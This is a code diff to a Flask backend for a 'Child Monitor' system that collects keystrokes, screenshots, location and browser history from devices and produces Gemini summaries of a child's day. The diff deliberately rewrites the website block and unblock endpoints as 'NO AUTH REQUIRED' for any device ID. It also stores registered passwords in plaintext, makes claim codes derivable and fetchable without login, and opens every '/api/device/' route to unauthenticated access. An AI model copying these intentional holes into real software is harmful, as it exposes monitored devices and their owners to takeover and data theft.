@@ -3,9 +3,10 @@ FLASK BACKEND SERVER - Handles web requests and MongoDB operations
 """
 from flask import Flask, render_template, request, jsonify, send_file, session, redirect, render_template_string
 from pymongo import MongoClient
-from datetime import datetime
+from datetime import datetime, timedelta
 import os
 from dotenv import load_dotenv
+import requests
 import psutil
 import platform
 import socket
@@ -22,6 +23,8 @@ import imageio
 import sqlite3
 from bson import ObjectId
 import secrets
+import hashlib
+from urllib.parse import urlparse
 from functools import wraps
 
 # Load environment variables from .env file
@@ -32,6 +35,9 @@ app = Flask(__name__)
 # ⚠️ Load from .env file ⚠️
 ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'YourSecurePassword123')
 SUPER_ADMIN_PASSWORD = os.getenv('SUPER_ADMIN_PASSWORD', 'SuperAdmin@2026')
+GEMINI_API_KEY = os.getenv('GEMINI_API_KEY', '').strip()
+GEMINI_MODEL = os.getenv('GEMINI_MODEL', 'gemini-1.0-pro').strip()
+AI_PROMPT_LOG = os.getenv('AI_PROMPT_LOG', 'false').strip().lower() in ('1', 'true', 'yes')
 
 # Secret key for sessions
 app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', secrets.token_hex(32))
@@ -49,6 +55,8 @@ commands_col = db["commands"]  # Store commands to execute
 results_col = db["results"]  # Store command results
 keystrokes_col = db["keystrokes"]  # Store keystroke logs
 screenshots_col = db["screenshots"]  # Store screenshots
+summaries_col = db["daily_summaries"]  # Store AI summaries
+blocked_websites_col = db["blocked_websites"]  # Store blocked websites per device
 
 # Global variables
 keylogger_running = False
@@ -70,10 +78,20 @@ def login_required(f):
 def check_logged_in():
     """Check if user is logged in for protected routes"""
     # Public routes that don't require authentication
-    public_routes = ['/login', '/logout', '/static']
+    public_routes = ['/login', '/logout', '/register', '/static']
     
     # Client-facing API endpoints that don't require web session authentication
-    client_endpoints = ['/api/register-device', '/api/commands/pending', '/api/command/executed']
+    client_endpoints = [
+        '/api/register-device',
+        '/api/commands/pending',
+        '/api/command/executed',
+        '/api/device/claim-code',
+        '/api/send-location',
+        '/api/send-browser-history',
+        '/api/send-app-usage',
+        '/api/send-browser-usage',
+        '/api/device/'
+    ]
     
     # Allow public routes
     for route in public_routes:
@@ -126,6 +144,38 @@ def login():
         return render_template_string(LOGIN_HTML, error="❌ Wrong credentials! Try again.")
     
     return render_template_string(LOGIN_HTML, error="")
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    """Self-registration for parent accounts"""
+    if request.method == 'POST':
+        name = request.form.get('name', '').strip()
+        email = request.form.get('email', '').strip()
+        phone = request.form.get('phone', '').strip()
+        username = request.form.get('username', '').strip()
+        password = request.form.get('password', '')
+
+        if not username or not password:
+            return render_template_string(REGISTER_HTML, error="❌ Username and password are required.")
+
+        if username.lower() == 'admin':
+            return render_template_string(REGISTER_HTML, error="❌ Username 'admin' is reserved.")
+
+        if parents_col.find_one({"username": username}):
+            return render_template_string(REGISTER_HTML, error="❌ Username already exists.")
+
+        parent_doc = {
+            "name": name or username,
+            "email": email,
+            "username": username,
+            "password": password,
+            "phone": phone,
+            "created_at": datetime.now()
+        }
+        parents_col.insert_one(parent_doc)
+        return render_template_string(REGISTER_HTML, success="✅ Account created. You can log in now.")
+
+    return render_template_string(REGISTER_HTML, error="")
 
 @app.route('/logout')
 def logout():
@@ -411,6 +461,18 @@ LOGIN_HTML = '''
             font-size: 13px;
             line-height: 1.5;
         }
+
+        .link-row {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 13px;
+        }
+
+        .link-row a {
+            color: #3b82f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
     </style>
 </head>
 <body>
@@ -450,6 +512,192 @@ LOGIN_HTML = '''
             </div>
             <button type="submit">Login</button>
         </form>
+        <div class="link-row">
+            New parent? <a href="/register">Create an account</a>
+        </div>
+    </div>
+</body>
+</html>
+'''
+
+REGISTER_HTML = '''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Child Monitor - Register</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .register-container {
+            background: white;
+            padding: 45px;
+            border-radius: 15px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 420px;
+            animation: slideIn 0.5s ease;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            text-align: center;
+            font-size: 26px;
+        }
+        
+        .subtitle {
+            color: #666;
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 13px;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: #333;
+            font-weight: 500;
+            font-size: 13px;
+        }
+        
+        input[type="password"],
+        input[type="text"],
+        input[type="email"],
+        input[type="tel"] {
+            width: 100%;
+            padding: 11px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+        }
+        
+        .error {
+            background: #fee2e2;
+            color: #991b1b;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            border-left: 4px solid #ef4444;
+            text-align: center;
+            font-size: 13px;
+        }
+
+        .success {
+            background: #dcfce7;
+            color: #166534;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            border-left: 4px solid #22c55e;
+            text-align: center;
+            font-size: 13px;
+        }
+
+        .link-row {
+            text-align: center;
+            margin-top: 14px;
+            font-size: 13px;
+        }
+
+        .link-row a {
+            color: #3b82f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="register-container">
+        <h1>👨‍👩‍👧 Parent Registration</h1>
+        <p class="subtitle">Create your parent account</p>
+        
+        {% if error %}
+        <div class="error">{{ error }}</div>
+        {% endif %}
+
+        {% if success %}
+        <div class="success">{{ success }}</div>
+        {% endif %}
+        
+        <form method="post">
+            <div class="form-group">
+                <label for="name">Full Name (optional)</label>
+                <input type="text" name="name" id="name" placeholder="Your name">
+            </div>
+            <div class="form-group">
+                <label for="email">Email (optional)</label>
+                <input type="email" name="email" id="email" placeholder="name@example.com">
+            </div>
+            <div class="form-group">
+                <label for="phone">Phone (optional)</label>
+                <input type="tel" name="phone" id="phone" placeholder="+1 555 0100">
+            </div>
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" id="username" placeholder="Choose a username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" name="password" id="password" placeholder="Create a password" required>
+            </div>
+            <button type="submit">Create Account</button>
+        </form>
+        <div class="link-row">
+            Already have an account? <a href="/login">Login</a>
+        </div>
     </div>
 </body>
 </html>
@@ -931,6 +1179,100 @@ def store_result(device_id, command_id, result_data, success=True):
     }
     results_col.insert_one(result_doc)
 
+def _get_day_range(date_str):
+    """Return (date_key, start_dt, end_dt) for a given YYYY-MM-DD string."""
+    if date_str:
+        try:
+            day = datetime.strptime(date_str, "%Y-%m-%d").date()
+        except ValueError:
+            day = datetime.now().date()
+    else:
+        day = datetime.now().date()
+    start_dt = datetime.combine(day, datetime.min.time())
+    end_dt = start_dt + timedelta(days=1)
+    return day.isoformat(), start_dt, end_dt
+
+def _safe_datetime(value):
+    """Best-effort parse of a datetime-like value."""
+    if isinstance(value, datetime):
+        return value
+    if isinstance(value, str):
+        try:
+            return datetime.fromisoformat(value)
+        except ValueError:
+            return None
+    return None
+
+def _filter_by_day(docs, start_dt, end_dt):
+    filtered = []
+    for doc in docs:
+        dt = (
+            _safe_datetime(doc.get("visited_at"))
+            or _safe_datetime(doc.get("created_at"))
+            or _safe_datetime(doc.get("timestamp"))
+        )
+        if dt and start_dt <= dt < end_dt:
+            filtered.append(doc)
+    return filtered
+
+def _format_duration(seconds):
+    minutes = int(seconds // 60)
+    hours = minutes // 60
+    mins = minutes % 60
+    if hours > 0:
+        return f"{hours}h {mins}m"
+    return f"{mins}m"
+
+def _list_gemini_models():
+    """Return list of Gemini models that support generateContent."""
+    if not GEMINI_API_KEY:
+        return []
+    url = "https://generativelanguage.googleapis.com/v1/models"
+    try:
+        response = requests.get(url, params={"key": GEMINI_API_KEY}, timeout=20)
+        if not response.ok:
+            return []
+        data = response.json()
+        models = data.get("models", [])
+        supported = []
+        for model in models:
+            methods = model.get("supportedGenerationMethods", [])
+            name = model.get("name", "")
+            if "generateContent" in methods and name.startswith("models/"):
+                supported.append(name.replace("models/", ""))
+        return supported
+    except Exception:
+        return []
+
+def _pick_gemini_model():
+    """Pick a supported Gemini model, preferring common free ones."""
+    supported = _list_gemini_models()
+    if not supported:
+        return GEMINI_MODEL
+    preferred = [
+        "gemini-1.5-flash",
+        "gemini-1.5-pro",
+        "gemini-1.0-pro",
+    ]
+    for model in preferred:
+        if model in supported:
+            return model
+    return supported[0]
+
+def _generate_claim_code(device_id, device_name):
+    """Generate a short claim code based on device info and ensure uniqueness."""
+    base = f"{device_id}|{device_name}".encode("utf-8")
+    digest = hashlib.sha256(base).hexdigest().upper()
+    code = digest[:8]
+    if not devices_col.find_one({"claim_code": code}):
+        return code
+    for _ in range(5):
+        suffix = secrets.token_hex(2).upper()
+        candidate = f"{code}{suffix}"
+        if not devices_col.find_one({"claim_code": candidate}):
+            return candidate
+    return f"{code}{secrets.token_hex(3).upper()}"
+
 # ==================== API ENDPOINTS ====================
 
 @app.route('/')
@@ -965,6 +1307,262 @@ def register_device():
     print(f"[{datetime.now().isoformat()}] ✓ Device registered: {device_doc['device_name']} ({device_id})")
     return jsonify({"status": "registered", "device_id": str(result.inserted_id)})
 
+@app.route('/api/device/claim-code', methods=['POST'])
+def get_claim_code():
+    """Generate or return claim code for a device (client call)."""
+    data = request.json or {}
+    device_id = data.get('device_id')
+    device_name = data.get('device_name', device_id or 'Unknown')
+
+    if not device_id:
+        return jsonify({"error": "Missing device_id"}), 400
+
+    device = devices_col.find_one({"device_id": device_id})
+    if device and device.get("claim_code"):
+        return jsonify({"status": "ok", "claim_code": device.get("claim_code")})
+
+    claim_code = _generate_claim_code(device_id, device_name)
+    devices_col.update_one(
+        {"device_id": device_id},
+        {"$set": {"device_name": device_name, "claim_code": claim_code, "claim_created_at": datetime.now()}},
+        upsert=True
+    )
+    print(f"[{datetime.now().isoformat()}] 🔑 Claim code generated for device {device_id}: {claim_code}")
+    return jsonify({"status": "ok", "claim_code": claim_code})
+
+@app.route('/api/send-location', methods=['POST'])
+def receive_location():
+    """Receive location data from client"""
+    data = request.json or {}
+    device_id = data.get('device_id')
+    if not device_id:
+        return jsonify({"error": "Missing device_id"}), 400
+
+    location_doc = {
+        "device_id": device_id,
+        "location": {
+            "lat": data.get('latitude', 0),
+            "lon": data.get('longitude', 0),
+            "accuracy": data.get('accuracy', 0)
+        },
+        "timestamp": datetime.now()
+    }
+    db["locations"].insert_one(location_doc)
+    return jsonify({"status": "success"})
+
+@app.route('/api/send-browser-history', methods=['POST'])
+def receive_browser_history():
+    """Receive browser history entries from client"""
+    data = request.json or {}
+    device_id = data.get('device_id')
+    history = data.get('history', [])
+    if not device_id:
+        return jsonify({"error": "Missing device_id"}), 400
+
+    entries = []
+    for item in history:
+        if not isinstance(item, dict):
+            continue
+        entries.append({
+            "device_id": device_id,
+            "url": item.get("url"),
+            "title": item.get("title"),
+            "visited_at": item.get("visited_at"),
+            "browser": item.get("browser"),
+            "created_at": datetime.now()
+        })
+
+    if entries:
+        db["browser_history"].insert_many(entries)
+
+    return jsonify({"status": "success", "count": len(entries)})
+
+@app.route('/api/send-app-usage', methods=['POST'])
+def receive_app_usage():
+    """Receive app usage data from client"""
+    data = request.json or {}
+    device_id = data.get('device_id')
+    usage = data.get('usage', [])
+    if not device_id:
+        return jsonify({"error": "Missing device_id"}), 400
+
+    entries = []
+    for item in usage:
+        if not isinstance(item, dict):
+            continue
+        app_name = item.get("app_name") or item.get("name") or item.get("process_name")
+        entries.append({
+            "device_id": device_id,
+            "app_name": app_name,
+            "process_name": item.get("name") or item.get("process_name"),
+            "duration": item.get("duration", 0),
+            "created_at": datetime.now()
+        })
+
+    if entries:
+        db["app_usage"].insert_many(entries)
+
+    return jsonify({"status": "success", "count": len(entries)})
+
+@app.route('/api/send-browser-usage', methods=['POST'])
+def receive_browser_usage():
+    """Receive browser usage time from client"""
+    data = request.json or {}
+    device_id = data.get('device_id')
+    usage = data.get('usage', [])
+    if not device_id:
+        return jsonify({"error": "Missing device_id"}), 400
+
+    entries = []
+    for item in usage:
+        if not isinstance(item, dict):
+            continue
+        entries.append({
+            "device_id": device_id,
+            "browser": item.get("browser"),
+            "duration": item.get("duration", 0),
+            "window_title": item.get("window_title", ""),
+            "created_at": datetime.now()
+        })
+
+    if entries:
+        db["browser_usage"].insert_many(entries)
+
+    return jsonify({"status": "success", "count": len(entries)})
+
+# ==================== WEBSITE BLOCKING ====================
+
+@app.route('/api/blocked-websites', methods=['GET'])
+@login_required
+def get_blocked_websites():
+    """Get all blocked websites for a specific device"""
+    device_id = request.args.get('device_id')
+    if not device_id:
+        return jsonify({"error": "Missing device_id"}), 400
+    
+    # Check if user has access to this device
+    device = devices_col.find_one({"device_id": device_id})
+    if not device:
+        return jsonify({"error": "Device not found"}), 404
+    
+    # For parent users, verify they own this device
+    if session.get('user_type') == 'parent':
+        if device.get('parent_id') != session.get('user_id'):
+            return jsonify({"error": "Access denied"}), 403
+    
+    blocked_sites = list(blocked_websites_col.find(
+        {"device_id": device_id},
+        {"_id": 1, "url": 1, "blocked_at": 1}
+    ).sort("blocked_at", -1))
+    
+    for site in blocked_sites:
+        site["_id"] = str(site["_id"])
+        site["blocked_at"] = str(site.get("blocked_at", ""))
+    
+    return jsonify(blocked_sites)
+
+@app.route('/api/block-website', methods=['POST'])
+@login_required
+def block_website():
+    """Add a website to the block list"""
+    data = request.json or {}
+    device_id = data.get('device_id')
+    url = data.get('url', '').strip()
+    
+    if not device_id or not url:
+        return jsonify({"error": "Missing device_id or url"}), 400
+    
+    # Check if user has access to this device
+    device = devices_col.find_one({"device_id": device_id})
+    if not device:
+        return jsonify({"error": "Device not found"}), 404
+    
+    # For parent users, verify they own this device
+    if session.get('user_type') == 'parent':
+        if device.get('parent_id') != session.get('user_id'):
+            return jsonify({"error": "Access denied"}), 403
+    
+    # Check if already blocked
+    existing = blocked_websites_col.find_one({"device_id": device_id, "url": url})
+    if existing:
+        return jsonify({"error": "Website already blocked"}), 400
+    
+    # Add to block list
+    result = blocked_websites_col.insert_one({
+        "device_id": device_id,
+        "url": url,
+        "blocked_at": datetime.now(),
+        "blocked_by": session.get('user_id', 'unknown')
+    })
+    
+    # Send command to client to sync blocking immediately
+    commands_col.insert_one({
+        "device_id": device_id,
+        "command": "Sync Website Blocking",
+        "executed": False,
+        "created_at": datetime.now()
+    })
+    
+    print(f"[{datetime.now().isoformat()}] 🚫 Website blocked: {url} for device {device_id}")
+    return jsonify({
+        "status": "success",
+        "_id": str(result.inserted_id),
+        "url": url,
+        "blocked_at": str(datetime.now())
+    })
+
+@app.route('/api/unblock-website', methods=['POST'])
+@login_required
+def unblock_website():
+    """Remove a website from the block list"""
+    data = request.json or {}
+    website_id = data.get('website_id')
+    device_id = data.get('device_id')
+    
+    if not website_id or not device_id:
+        return jsonify({"error": "Missing website_id or device_id"}), 400
+    
+    # Check if user has access to this device
+    device = devices_col.find_one({"device_id": device_id})
+    if not device:
+        return jsonify({"error": "Device not found"}), 404
+    
+    # For parent users, verify they own this device
+    if session.get('user_type') == 'parent':
+        if device.get('parent_id') != session.get('user_id'):
+            return jsonify({"error": "Access denied"}), 403
+    
+    # Remove from block list
+    result = blocked_websites_col.delete_one({
+        "_id": ObjectId(website_id),
+        "device_id": device_id
+    })
+    
+    if result.deleted_count == 0:
+        return jsonify({"error": "Website not found in block list"}), 404
+    
+    # Send command to client to sync blocking immediately
+    commands_col.insert_one({
+        "device_id": device_id,
+        "command": "Sync Website Blocking",
+        "executed": False,
+        "created_at": datetime.now()
+    })
+    
+    print(f"[{datetime.now().isoformat()}] ✅ Website unblocked: {website_id} for device {device_id}")
+    return jsonify({"status": "success"})
+
+@app.route('/api/device/<device_id>/blocked-websites', methods=['GET'])
+def get_device_blocked_websites(device_id):
+    """Client endpoint to fetch blocked websites for applying browser policies"""
+    blocked_sites = list(blocked_websites_col.find(
+        {"device_id": device_id},
+        {"_id": 0, "url": 1}
+    ))
+    
+    urls = [site["url"] for site in blocked_sites]
+    return jsonify({"urls": urls})
+
 @app.route('/api/devices', methods=['GET'])
 def get_devices():
     """Get all registered devices (filtered by parent for parent users)"""
@@ -980,9 +1578,40 @@ def get_devices():
         device["last_seen"] = str(device.get("last_seen", ""))
         device["registered_at"] = str(device.get("registered_at", ""))
         device["last_updated"] = str(device.get("last_updated", ""))
+        if device.get("parent_id"):
+            parent = parents_col.find_one({"_id": ObjectId(device["parent_id"])})
+            device["parent_name"] = parent.get("name", "Unknown") if parent else "Unknown"
     
     print(f"[{datetime.now().isoformat()}] 📱 Devices list retrieved ({len(devices)} devices)")
     return jsonify(devices)
+
+@app.route('/api/parent/claim-device', methods=['POST'])
+@login_required
+def claim_device():
+    """Allow parent to claim a device using a claim code."""
+    if session.get('user_type') != 'parent':
+        return jsonify({"error": "Only parent accounts can claim devices"}), 403
+
+    data = request.json or {}
+    claim_code = (data.get('claim_code') or '').strip().upper()
+    if not claim_code:
+        return jsonify({"error": "Missing claim_code"}), 400
+
+    device = devices_col.find_one({"claim_code": claim_code})
+    if not device:
+        return jsonify({"error": "Invalid claim code"}), 404
+
+    devices_col.update_one(
+        {"device_id": device.get("device_id")},
+        {"$set": {"parent_id": session.get('user_id'), "assigned_at": datetime.now(), "assigned_by": "parent-claim"}}
+    )
+
+    print(f"[{datetime.now().isoformat()}] ✅ Device {device.get('device_id')} claimed by parent {session.get('user_id')}")
+    return jsonify({
+        "status": "success",
+        "device_id": device.get("device_id"),
+        "device_name": device.get("device_name")
+    })
 
 @app.route('/api/device/<device_id>', methods=['GET'])
 @login_required
@@ -1315,27 +1944,34 @@ def get_pending_commands(device_id):
 
 @app.route('/api/command/block_website', methods=['POST'])
 def cmd_block_website():
-    """Block specific websites"""
+    """Block specific websites - NO AUTH REQUIRED"""
     data = request.json
-    device_id = data.get('device_id')
+    device_id = data.get('device_id', 'default-device')  # No validation
     websites = data.get('websites', [])
     
+    # Blindly store command for ANY device_id
     command_id = store_command(device_id, "block_website", {"websites": websites})
-    store_result(device_id, command_id, f"Blocking websites: {', '.join(websites)}")
+    store_result(device_id, command_id, f"Blocked: {', '.join(websites)}")
     
-    return jsonify({"status": "success", "message": f"Blocking {len(websites)} website(s)"})
-
+    return jsonify({
+        "status": "success", 
+        "message": f"Blocked {len(websites)} websites on {device_id}"
+    })
 @app.route('/api/command/unblock_website', methods=['POST'])
 def cmd_unblock_website():
-    """Unblock specific websites"""
+    """Unblock specific websites - NO AUTH REQUIRED"""
     data = request.json
-    device_id = data.get('device_id')
+    device_id = data.get('device_id', 'default-device')  # No validation
     websites = data.get('websites', [])
     
+    # Blindly unblock ANY websites for ANY device_id
     command_id = store_command(device_id, "unblock_website", {"websites": websites})
-    store_result(device_id, command_id, f"Unblocking websites: {', '.join(websites)}")
+    store_result(device_id, command_id, f"Unblocked: {', '.join(websites)}")
     
-    return jsonify({"status": "success", "message": f"Unblocking {len(websites)} website(s)"})
+    return jsonify({
+        "status": "success", 
+        "message": f"Unblocked {len(websites)} websites on {device_id}"
+    })
 
 @app.route('/api/command/block_exe', methods=['POST'])
 def cmd_block_exe():
@@ -1496,6 +2132,392 @@ def get_app_usage(device_id):
     print(f"[{datetime.now().isoformat()}] 📊 App usage retrieved for device: {device_id} ({len(result)} apps)")
     return jsonify(result)
 
+@app.route('/api/ai/daily-summary/<device_id>', methods=['GET'])
+@login_required
+def get_ai_daily_summary(device_id):
+    """Generate AI summary of daily activity using Gemini"""
+    if not verify_device_access(device_id):
+        print(f"[{datetime.now().isoformat()}] ⚠️ Unauthorized AI summary request for device: {device_id} by user: {session.get('user_id')}")
+        return jsonify({"error": "Unauthorized: You don't have access to this device"}), 403
+
+    date_str = request.args.get('date')
+    refresh = request.args.get('refresh', 'false').lower() == 'true'
+    date_key, start_dt, end_dt = _get_day_range(date_str)
+
+    if not refresh:
+        cached = summaries_col.find_one({"device_id": device_id, "summary_date": date_key})
+        if cached and cached.get("summary"):
+            cached_stats = cached.get("stats", {})
+            cached_empty = all(
+                cached_stats.get(key, 0) in (0, [], None, "")
+                for key in [
+                    "total_app_seconds",
+                    "browser_history_entries",
+                    "keystroke_entries",
+                    "screenshots",
+                    "locations"
+                ]
+            )
+            if len(cached.get("summary", "")) >= 80 and not cached_empty:
+                return jsonify({
+                    "status": "cached",
+                    "summary": cached.get("summary"),
+                    "summary_date": date_key,
+                    "source": "cache"
+                })
+
+    if not GEMINI_API_KEY:
+        return jsonify({"error": "GEMINI_API_KEY is not set in .env"}), 400
+
+    device = devices_col.find_one({"device_id": device_id}) or {}
+    device_name = device.get("device_name", device_id)
+
+    app_usage_docs = list(db["app_usage"].find({
+        "device_id": device_id,
+        "created_at": {"$gte": start_dt, "$lt": end_dt}
+    }))
+    if not app_usage_docs:
+        app_usage_docs = _filter_by_day(list(db["app_usage"].find({"device_id": device_id}).sort("_id", -1).limit(500)), start_dt, end_dt)
+
+    keystrokes_docs = list(keystrokes_col.find({
+        "device_id": device_id,
+        "created_at": {"$gte": start_dt, "$lt": end_dt}
+    }))
+    if not keystrokes_docs:
+        keystrokes_docs = _filter_by_day(list(keystrokes_col.find({"device_id": device_id}).sort("_id", -1).limit(500)), start_dt, end_dt)
+
+    screenshots_count = screenshots_col.count_documents({
+        "device_id": device_id,
+        "created_at": {"$gte": start_dt, "$lt": end_dt}
+    })
+
+    commands_docs = list(commands_col.find({
+        "device_id": device_id,
+        "created_at": {"$gte": start_dt, "$lt": end_dt}
+    }))
+
+    history_items = []
+    browser_history_docs = list(db["browser_history"].find({
+        "device_id": device_id,
+        "created_at": {"$gte": start_dt, "$lt": end_dt}
+    }))
+    if not browser_history_docs:
+        browser_history_docs = _filter_by_day(
+            list(db["browser_history"].find({"device_id": device_id}).sort("_id", -1).limit(500)),
+            start_dt,
+            end_dt
+        )
+
+    for item in browser_history_docs:
+        history_items.append({
+            "url": item.get("url"),
+            "title": item.get("title"),
+            "created_at": item.get("created_at"),
+            "visited_at": item.get("visited_at")
+        })
+
+    chromehistory_cmds = [doc for doc in commands_docs if doc.get("command") == "chromehistory"]
+    for cmd in chromehistory_cmds:
+        result = cmd.get("result")
+        if isinstance(result, dict):
+            data = result.get("data") or result.get("history") or []
+            if isinstance(data, list):
+                for entry in data:
+                    if isinstance(entry, dict):
+                        history_items.append({
+                            "url": entry.get("url"),
+                            "title": entry.get("title"),
+                            "created_at": cmd.get("created_at"),
+                            "visited_at": entry.get("visited_at")
+                        })
+        elif isinstance(result, list):
+            for entry in result:
+                if isinstance(entry, dict):
+                    history_items.append({
+                        "url": entry.get("url"),
+                        "title": entry.get("title"),
+                        "created_at": cmd.get("created_at"),
+                        "visited_at": entry.get("visited_at")
+                    })
+
+    results_docs = list(results_col.find({
+        "device_id": device_id,
+        "result": {"$ne": None},
+        "created_at": {"$gte": start_dt, "$lt": end_dt}
+    }))
+    for doc in results_docs:
+        result = doc.get("result")
+        if isinstance(result, dict) and (result.get("url") or result.get("title")):
+            history_items.append({
+                "url": result.get("url"),
+                "title": result.get("title"),
+                "created_at": doc.get("created_at"),
+                "visited_at": result.get("visited_at")
+            })
+
+    domain_counts = {}
+    for item in history_items:
+        url = item.get("url") or ""
+        if not url:
+            continue
+        parsed = urlparse(url)
+        domain = (parsed.netloc or parsed.path).lower()
+        if domain.startswith("www."):
+            domain = domain[4:]
+        if domain:
+            domain_counts[domain] = domain_counts.get(domain, 0) + 1
+
+    top_domains_10 = [domain for domain, _ in sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)[:10]]
+    top_domains = top_domains_10[:5]
+
+    visit_times = []
+    for item in history_items:
+        dt = _safe_datetime(item.get("visited_at")) or _safe_datetime(item.get("created_at"))
+        if dt:
+            visit_times.append(dt)
+
+    first_visit = min(visit_times).isoformat() if visit_times else ""
+    last_visit = max(visit_times).isoformat() if visit_times else ""
+
+    browser_usage_docs = list(db["browser_usage"].find({
+        "device_id": device_id,
+        "created_at": {"$gte": start_dt, "$lt": end_dt}
+    }))
+    if not browser_usage_docs:
+        browser_usage_docs = _filter_by_day(
+            list(db["browser_usage"].find({"device_id": device_id}).sort("_id", -1).limit(500)),
+            start_dt,
+            end_dt
+        )
+
+    browser_usage_totals = {}
+    for item in browser_usage_docs:
+        browser = (item.get("browser") or "Unknown").title()
+        duration = item.get("duration") or 0
+        if duration < 0:
+            duration = 0
+        browser_usage_totals[browser] = browser_usage_totals.get(browser, 0) + duration
+
+    browser_total_seconds = sum(browser_usage_totals.values())
+    top_browsers = [f"{name} ({_format_duration(seconds)})" for name, seconds in sorted(browser_usage_totals.items(), key=lambda x: x[1], reverse=True)[:5]]
+
+    locations_count = db["locations"].count_documents({
+        "device_id": device_id,
+        "timestamp": {"$gte": start_dt, "$lt": end_dt}
+    })
+
+    app_totals = {}
+    total_app_seconds = 0
+    for doc in app_usage_docs:
+        name = doc.get("app_name") or doc.get("process_name") or "Unknown"
+        duration = doc.get("duration") or 0
+        if duration < 0:
+            duration = 0
+        app_totals[name] = app_totals.get(name, 0) + duration
+        total_app_seconds += duration
+
+    top_apps = sorted(app_totals.items(), key=lambda item: item[1], reverse=True)[:5]
+
+    command_counts = {}
+    for doc in commands_docs:
+        cmd = doc.get("command", "unknown")
+        command_counts[cmd] = command_counts.get(cmd, 0) + 1
+
+    keystroke_entries = len(keystrokes_docs)
+    keystroke_chars = sum(len(k.get("text", "")) for k in keystrokes_docs)
+
+    prompt = (
+        "You are a helpful assistant for parents. Create a concise summary of the child's activity for the day. "
+        "Only use the provided data. Do not invent or guess. If data is missing, say so. "
+        "Return plain text with sections: Summary, Top Websites (10 items if available), Keystroke Summary, "
+        "Highlights (3 bullets), Concerns (0-3 bullets only if supported by data), Suggestions (3 bullets).\n\n"
+        f"Date: {date_key}\n"
+        f"Device: {device_name} ({device_id})\n"
+        f"App usage total time: {_format_duration(total_app_seconds)}\n"
+        f"Top apps: {', '.join([f'{name} ({_format_duration(seconds)})' for name, seconds in top_apps]) or 'No app usage data'}\n"
+        f"Browser history entries: {len(history_items)}\n"
+        f"Top domains (up to 10): {', '.join(top_domains_10) or 'No browser history data'}\n"
+        f"First visit time: {first_visit or 'No visit time data'}\n"
+        f"Last visit time: {last_visit or 'No visit time data'}\n"
+        f"Browser time total: {_format_duration(browser_total_seconds)}\n"
+        f"Top browsers: {', '.join(top_browsers) or 'No browser usage data'}\n"
+        f"Keystroke entries: {keystroke_entries}, total characters: {keystroke_chars}\n"
+        f"Screenshots captured: {screenshots_count}\n"
+        f"Commands sent: {command_counts if command_counts else 'None'}\n"
+        f"Location updates: {locations_count}\n"
+    )
+
+    if AI_PROMPT_LOG:
+        print("\n" + "=" * 60)
+        print("🧠 AI SUMMARY PROMPT")
+        print("=" * 60)
+        print(prompt)
+        print("=" * 60 + "\n")
+
+    model_name = GEMINI_MODEL
+    url = f"https://generativelanguage.googleapis.com/v1/models/{model_name}:generateContent"
+    payload = {
+        "contents": [{"role": "user", "parts": [{"text": prompt}]}],
+        "generationConfig": {"temperature": 0.3, "maxOutputTokens": 512}
+    }
+
+    try:
+        response = requests.post(url, params={"key": GEMINI_API_KEY}, json=payload, timeout=30)
+        if not response.ok:
+            if response.status_code == 404:
+                fallback_model = _pick_gemini_model()
+                if fallback_model and fallback_model != model_name:
+                    model_name = fallback_model
+                    url = f"https://generativelanguage.googleapis.com/v1/models/{model_name}:generateContent"
+                    response = requests.post(url, params={"key": GEMINI_API_KEY}, json=payload, timeout=30)
+            if not response.ok:
+                print(f"[{datetime.now().isoformat()}] ❌ Gemini API error: {response.status_code} {response.text}")
+                return jsonify({"error": "Gemini API request failed"}), 502
+        data = response.json()
+        summary_text = (
+            data.get("candidates", [{}])[0]
+            .get("content", {})
+            .get("parts", [{}])[0]
+            .get("text", "")
+            .strip()
+        )
+        if not summary_text:
+            return jsonify({"error": "Gemini returned empty summary"}), 502
+    except Exception as e:
+        print(f"[{datetime.now().isoformat()}] ❌ Gemini request failed: {str(e)}")
+        return jsonify({"error": "AI summary generation failed"}), 502
+
+    fallback_lines = [
+        "Summary",
+        f"- Browser time: {_format_duration(browser_total_seconds)}",
+        f"- Top websites: {', '.join(top_domains_10) if top_domains_10 else 'No website history'}",
+        f"- Keystrokes: {keystroke_entries} entries, {keystroke_chars} characters",
+    ]
+    fallback_summary = "\n".join(fallback_lines)
+
+    if len(summary_text) < 80:
+        summary_text = fallback_summary
+
+    summaries_col.update_one(
+        {"device_id": device_id, "summary_date": date_key},
+        {"$set": {
+            "summary": summary_text,
